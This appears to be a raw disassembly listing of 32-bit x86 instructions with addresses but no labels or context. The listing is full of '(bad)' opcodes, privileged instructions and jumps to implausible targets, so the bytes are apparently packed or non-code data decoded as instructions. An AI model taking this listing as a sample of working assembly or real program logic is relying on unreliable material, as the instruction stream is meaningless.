  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
